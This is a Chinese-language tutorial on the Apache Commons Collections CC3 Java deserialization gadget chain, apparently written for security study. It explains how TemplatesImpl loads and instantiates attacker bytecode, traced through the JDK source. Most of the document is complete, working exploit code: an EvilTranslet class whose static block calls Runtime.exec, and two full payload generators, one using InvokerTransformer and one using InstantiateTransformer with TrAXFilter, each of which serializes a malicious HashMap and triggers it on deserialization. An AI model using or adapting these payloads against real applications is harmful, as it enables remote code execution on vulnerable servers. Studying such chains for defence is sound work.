## 一，链条总览
CC3 的全称是 CommonsCollections3 反序列化利用链，其核心思路是用 **TemplatesImpl 加载恶意字节码**来替代 Runtime.exec() 调用，从而绕过 InvokerTransformer 被限制的场景。

### 链 1：InvokerTransformer → TemplatesImpl.newTransformer
```plain
ObjectInputStream.readObject()
  -> HashMap.readObject()
    -> HashMap.hash(key)
      -> TiedMapEntry.hashCode()
        -> TiedMapEntry.getValue()
          -> LazyMap.get("key")
            -> ChainedTransformer.transform()
              -> ConstantTransformer.transform() → 返回 templatesImpl 对象
              -> InvokerTransformer.transform()
                -> TemplatesImpl.newTransformer()          ← 反射调用
                  -> getTransletInstance()
                    -> defineTransletClasses()
                      -> TransletClassLoader.defineClass()  ← 加载字节码得到 Class 对象
                    -> _class[_transletIndex].newInstance() ← 实例化类
                      -> <init>()                           ← 构造函数
                        -> 父类 AbstractTranslet 构造
                        -> static {} 块                     ← 执行恶意代码
                          -> Runtime.getRuntime().exec()
```

> ⚠️ **重要：** `defineClass()` 只完成字节码 → Class 对象的转换，**不会执行 static 块**。类的初始化（含 static {}）发生在 `newInstance()` 触发类加载器对 Class 对象进行初始化时。
>
> Java 类生命周期：`defineClass → 得到 Class 对象 → newInstance() → 初始化类（执行 static）→ 调用构造函数`
>

### 链 2：InstantiateTransformer → TrAXFilter → TemplatesImpl.newTransformer
```plain
ObjectInputStream.readObject()
  -> HashMap.readObject()
    -> HashMap.hash(key)
      -> TiedMapEntry.hashCode()
        -> TiedMapEntry.getValue()
          -> LazyMap.get("key")
            -> ChainedTransformer.transform()
              -> ConstantTransformer.transform() → 返回 TrAXFilter.class
              -> InstantiateTransformer.transform()
                -> TrAXFilter 构造函数
                  -> TemplatesImpl.newTransformer()    ← TrAXFilter 构造中自动调用
                    -> getTransletInstance()
                      -> defineTransletClasses()
                        -> TransletClassLoader.defineClass()
                      -> _class[_transletIndex].newInstance()
                        -> <init>() → static {} → Runtime.exec()
```

---

### 为什么 CC3 可以绕过 InvokerTransformer 的限制？
在 CC1 中，攻击链通过 `InvokerTransformer` 直接调用 `Runtime.exec()` 来执行命令：

```plain
InvokerTransformer.transform()
  -> Method.invoke(Runtime.getRuntime(), "exec", "calc")
```

但当 `InvokerTransformer` 在 JDK 8u71+ 版本中被修复后（`InvokerTransformer` 所依赖的 `transform()` 方法返回值不再参与链式调用，或者反序列化时关键字段无法通过反射写入），我们需要一种**不直接依赖 InvokerTransformer 执行 Runtime.exec()** 的攻击方式。

CC3 的思路是：

```plain
InvokerTransformer.transform()
  -> Method.invoke(templatesImpl, "newTransformer", null)
```

InvokerTransformer 依然存在，但它**不再调用 Runtime.exec()**，而是调用 `TemplatesImpl.newTransformer()`。

而 `newTransformer()` 内部会完成：

1. `getTransletInstance()` → 获取 Translet 实例
2. `defineTransletClasses()` → 用自定义类加载器将字节码定义为 Class
3. `newInstance()` → 初始化类时执行 static 块中的 `Runtime.exec()`

**关键区别：**

+ CC1：`InvokerTransformer` → `Runtime.exec()`（执行系统命令）
+ CC3：`InvokerTransformer` → `TemplatesImpl.newTransformer()`（加载字节码）→ `Class.newInstance()` → `Runtime.exec()`（在 static 块中）

CC3 的攻击成功与否**不依赖 **`InvokerTransformer`** 是否能直接调用 **`Runtime.exec()`，而是依赖 `TemplatesImpl` 加载字节码并实例化。即使 `InvokerTransformer` 被部分限制，只要它还能调用任意类的任意方法（如 `newTransformer`），CC3 就仍然有效。

---

## 二，关键类及机制
### 1.TemplatesImpl
**TemplatesImpl 用于保存经过 XSLTC 编译后的 Translet 字节码，并在需要时通过自定义类加载器将这些字节码定义为 Java Class，再实例化为 AbstractTranslet 对象。**

承担三个阶段：

1. **保存**：内部 `_bytecodes` 字段保存原始字节码
2. **定义**：`defineTransletClasses()` 中通过 `TransletClassLoader.defineClass()` 将字节码转为 Class 对象
3. **实例化**：`getTransletInstance()` 中调用 `_class[_transletIndex].newInstance()` 创建实例

```java
// 核心方法：defineTransletClasses()
private void defineTransletClasses() throws TransformerConfigurationException {
    if (_bytecodes == null) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
        throw new TransformerConfigurationException(err.toString());
    }

    // 获取 TransletClassLoader（自定义类加载器）
    TransletClassLoader loader = (TransletClassLoader)
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                return new TransletClassLoader(ObjectFactory.findClassLoader(),
                                               _tfactory.getExternalExtensionsMap());
            }
        });

    try {
        final int classCount = _bytecodes.length;
        _class = new Class[classCount];

        if (classCount > 1) {
            _auxClasses = new HashMap<>();
        }

        for (int i = 0; i < classCount; i++) {
            // 遍历字节数组，用自定义类加载器加载字节码
            _class[i] = loader.defineClass(_bytecodes[i]);
            // 检查父类是否是 AbstractTranslet
            final Class superClass = _class[i].getSuperclass();
            if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                _transletIndex = i;  // 记录主类的索引位置
            } else {
                _auxClasses.put(_class[i].getName(), _class[i]);
            }
        }

        if (_transletIndex < 0) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    } catch (ClassFormatError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```

### 2.TransformerImpl
**TransformerImpl 是对 AbstractTranslet 的包装，实现 javax.xml.transform.Transformer 接口，对外提供统一的 XML 转换接口。**

```java
protected TransformerImpl(Translet translet, Properties outputProperties,
                          int indentNumber, TransformerFactoryImpl tfactory) {
    _translet = (AbstractTranslet) translet;
    _properties = createOutputProperties(outputProperties);
    _propertiesClone = (Properties) _properties.clone();
    _indentNumber = indentNumber;
    _tfactory = tfactory;
    // ...
}
```

构造函数接收一个 `AbstractTranslet` 对象（即编译后的 XSLT 转换程序），将其包装为标准的 `Transformer`。

当调用 `transform()` 方法时，实际调用的是内部的 `_translet.transform(...)`（即 `AbstractTranslet` 子类的 `transform` 方法），**不是 TemplatesImpl 的 transform**。

TransformerImpl 在整个链中的作用只是中转：TemplatesImpl.newTransformer() 封装了一个 TransformerImpl 返回，但链中实际不依赖它的 transform 方法，链的核心调用走的是 `getTransletInstance()` → 字节码加载 → 实例化这条路径。

### 3.AbstractTranslet
**AbstractTranslet 是 XSLTC 编译生成的转换程序父类，每个编译后的 XSLT 模板都会生成其子类，真正负责完成 XML 转换逻辑。**

其处理流程为：

```plain
XML 输入
  ↓
DOM 解析
  ↓
AbstractTranslet（编译后的转换程序）
  ↓
HTML / XML / Text 输出
```

`AbstractTranslet` 不是"DOM → XML"，而是"XML → DOM → Translet → HTML/XML/Text"。

恶意类通过继承 `AbstractTranslet`，使得 `TemplatesImpl` 在 `defineTransletClasses()` 中能识别它是主类（检查父类是否为 `AbstractTranslet`），从而被记录在 `_transletIndex` 中，后续通过 `newInstance()` 实例化时触发 static 块中的恶意代码。

---

## 三，详细步骤
开头部分同 CC1（AnnotationInvocationHandler → HashMap 的懒加载触发机制）。

### 1.构造恶意类
```java
public class EvilTranslet extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // 避免 postInitialization() 中 transletVersion < 101 造成空指针
    public EvilTranslet() {
        transletVersion = 101;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```

恶意类必须继承 `AbstractTranslet`，原因见下方步骤 4 中的说明。

### 2.TemplatesImpl.newTransformer()
```java
public synchronized Transformer newTransformer() throws TransformerConfigurationException {
    TransformerImpl transformer = new TransformerImpl(
        getTransletInstance(),    // ← 核心调用
        _outputProperties,
        _indentNumber,
        _tfactory
    );
    // ...
    return transformer;
}
```

**newTransformer 是 Templates 接口提供的标准入口**，真正完成字节码加载和实例化的是 `getTransletInstance()`。

### 3.getTransletInstance()
```java
private Translet getTransletInstance() throws TransformerConfigurationException {
    try {
        if (_name == null) return null;       // _name 为空直接返回
        if (_class == null) defineTransletClasses();  // 尚未加载 → 加载字节码

        // 从 _class 数组中取出主 Translet 类并实例化
        AbstractTranslet translet = (AbstractTranslet)
            _class[_transletIndex].newInstance();   // ← 触发 static 块！

        translet.postInitialization();
        translet.setTemplates(this);
        translet.setServicesMechnism(_useServicesMechanism);
        translet.setAllowedProtocols(_accessExternalStylesheet);
        if (_auxClasses != null) translet.setAuxiliaryClasses(_auxClasses);

        return translet;
    } catch (InstantiationException e) {
        // ...
    }
}
```

关键逻辑：

1. `_name` 为空 → 直接返回 null（因此 payload 必须设置 `_name` 字段）
2. `_class` 为空 → 调用 `defineTransletClasses()` 加载字节码为 Class 对象
3. `_class[_transletIndex].newInstance()` → **首次实例化该类，触发 static {} 中的恶意代码**

### 4.defineTransletClasses()
```java
private void defineTransletClasses() throws TransformerConfigurationException {
    if (_bytecodes == null) {
        throw new TransformerConfigurationException("...");
    }

    TransletClassLoader loader = (TransletClassLoader)
        AccessController.doPrivileged(...);

    try {
        final int classCount = _bytecodes.length;
        _class = new Class[classCount];

        for (int i = 0; i < classCount; i++) {
            _class[i] = loader.defineClass(_bytecodes[i]);   // ← 只做 defineClass，不实例化

            // 检查父类是否为 AbstractTranslet
            final Class superClass = _class[i].getSuperclass();
            if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                _transletIndex = i;     // 记录主 Translet 的位置
            } else {
                _auxClasses.put(_class[i].getName(), _class[i]);
            }
        }

        if (_transletIndex < 0) {
            throw new TransformerConfigurationException("...");
        }
    } catch (ClassFormatError e) {
        throw new TransformerConfigurationException("...");
    }
}
```

> ⚠️ **注意：** `defineTransletClasses()` **只完成 **`defineClass`**，不会实例化**。实例化发生在 `getTransletInstance()` 中的 `newInstance()` 调用。
>

#### 为什么恶意类必须继承 AbstractTranslet？
`defineTransletClasses()` 遍历所有加载得到的 Class，**寻找父类为 **`AbstractTranslet`** 的那个 Class**，并记录它在 `_class[]` 数组中的位置到 `_transletIndex`：

```java
if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
    _transletIndex = i;
}
```

如果没有找到继承 `AbstractTranslet` 的类，`_transletIndex` 保持 `-1`。

回到 `getTransletInstance()`：

```java
AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
```

当 `_transletIndex = -1` 时，访问 `_class[-1]` 会抛出 **数组越界异常**（ArrayIndexOutOfBoundsException），攻击失败。

### 5.TransletClassLoader
```java
static final class TransletClassLoader extends ClassLoader {
    private final Map<String, Class> _loadedExternalExtensionFunctions;

    TransletClassLoader(ClassLoader parent) {
        super(parent);
        _loadedExternalExtensionFunctions = null;
    }

    TransletClassLoader(ClassLoader parent, Map<String, Class> mapEF) {
        super(parent);
        _loadedExternalExtensionFunctions = mapEF;
    }
}
```

`TransletClassLoader` 是 `TemplatesImpl` 的内部静态类，继承自 `ClassLoader`，实现了自定义的类加载逻辑。

在 `defineTransletClasses()` 中通过 `AccessController.doPrivileged()` 创建，用于将 `_bytecodes` 中的字节码加载为 `Class` 对象。

---

## 四，Demo 实现
### 恶意类
```java
package org.cc.repro.cc3;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class EvilTranslet extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    // 避免 postInitialization() 中 transletVersion < 101 造成空指针
    public EvilTranslet() {
        transletVersion = 101;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```

---

### Demo 方案一：InvokerTransformer → TemplatesImpl.newTransformer
**调用链：**`InvokerTransformer`** → **`TemplatesImpl.newTransformer()`

```java
package org.cc.repro.cc3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3_Invoker {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templatesImpl = new TemplatesImpl();

        // 读取恶意字节码（EvilTranslet.class）
        byte[] classBytes = Files.readAllBytes(
            Paths.get("D:\\intellij\\CC\\CC3\\target\\classes\\org\\cc\\repro\\cc3\\EvilTranslet.class"));

        // 反射设置 _bytecodes — 保存恶意字节码
        Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templatesImpl, new byte[][]{classBytes});

        // 设置 _tfactory — 防止 newTransformer 中空指针
        Field tfactoryField = TemplatesImpl.class.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templatesImpl, new TransformerFactoryImpl());

        // 设置 _name — 防止 getTransletInstance 提前返回 null
        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templatesImpl, "test");

        // ========== 方案 A：InvokerTransformer 反射调用 newTransformer() ==========
        // 无害链（构造时防止提前触发）
        Transformer[] fakeChain = new Transformer[]{
                new ConstantTransformer(1)
        };
        // 恶意链：忽略输入，返回 templatesImpl，然后反射调用 newTransformer()
        Transformer[] evilChain = new Transformer[]{
                new ConstantTransformer(templatesImpl),
                new InvokerTransformer("newTransformer", null, null)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeChain);

        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
        HashMap outerMap = new HashMap();
        outerMap.put(entry, "value");   // 触发一次无害链，lazyMap 中会加入 "key"

        // 移除 key，确保反序列化时能再次触发 factory
        lazyMap.remove("key");

        // 替换为真正的恶意链
        setValue(chainedTransformer, "iTransformers", evilChain);

        System.out.println("序列化发送");
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc3.ser"));
        oos.writeObject(outerMap);
        oos.close();

        System.out.println("服务端反序列化接收");
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc3.ser"));
        ois.readObject();
        ois.close();
    }

    public static void setValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

---

### Demo 方案二：InstantiateTransformer → TrAXFilter → TemplatesImpl.newTransformer
**调用链：**`InstantiateTransformer`** → **`TrAXFilter`** 构造函数 → **`TemplatesImpl.newTransformer()`

```java
package org.cc.repro.cc3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3_Instantiate {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templatesImpl = new TemplatesImpl();

        // EvilTranslet 类的恶意字节码
        byte[] classBytes = Files.readAllBytes(
            Paths.get("D:\\intellij\\CC\\CC3\\target\\classes\\org\\cc\\repro\\cc3\\EvilTranslet.class"));

        // 反射设置 _bytecodes
        Field field = TemplatesImpl.class.getDeclaredField("_bytecodes");
        field.setAccessible(true);
        field.set(templatesImpl, new byte[][]{classBytes});

        // 设置 _tfactory，防止空指针
        Field tfactoryField = TemplatesImpl.class.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templatesImpl, new TransformerFactoryImpl());

        // 设置 _name，防止 getTransletInstance 提前返回
        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templatesImpl, "test");

        // ========== 方案 B：InstantiateTransformer → TrAXFilter 构造 ==========
        // TrAXFilter 构造函数中会调用 TemplatesImpl.newTransformer()
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(
                new Class[]{Templates.class},
                new Object[]{templatesImpl}
        );

        // 无害链（构造时防止提前触发）
        Transformer[] fakeChain = new Transformer[]{
            new ConstantTransformer(1)
        };
        // 恶意链：传递 TrAXFilter.class，然后通过 InstantiateTransformer 实例化
        Transformer[] evilChain = new Transformer[]{
            new ConstantTransformer(TrAXFilter.class),  // 传入 TrAXFilter 类对象
            instantiateTransformer                       // 反射调用构造函数
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeChain);

        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
        HashMap outerMap = new HashMap();
        outerMap.put(entry, "value");
        lazyMap.remove("key");

        setValue(chainedTransformer, "iTransformers", evilChain);

        System.out.println("序列化发送");
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc3.ser"));
        oos.writeObject(outerMap);
        oos.close();

        System.out.println("服务端反序列化接收");
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc3.ser"));
        ois.readObject();
        ois.close();
    }

    public static void setValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

---

## 五，Payload 构造说明
CC3 的 Payload 构造中，需要反射设置 `TemplatesImpl` 的三个关键字段：

| 字段 | 作用 | 说明 |
| --- | --- | --- |
| `_bytecodes` | 保存恶意字节码 | 存放 EvilTranslet.class 的字节数组，`defineTransletClasses()` 通过 `TransletClassLoader.defineClass()` 将其加载为 Class |
| `_name` | 防止 `getTransletInstance` 提前返回 | `getTransletInstance()` 第一行判断 `if (_name == null) return null;`，必须设为一个非空值 |
| `_tfactory` | 防止 `newTransformer` / `defineTransletClasses` 空指针 | `TransletClassLoader` 创建时需要 `_tfactory.getExternalExtensionsMap()`，为 null 时抛出 NPE |


---

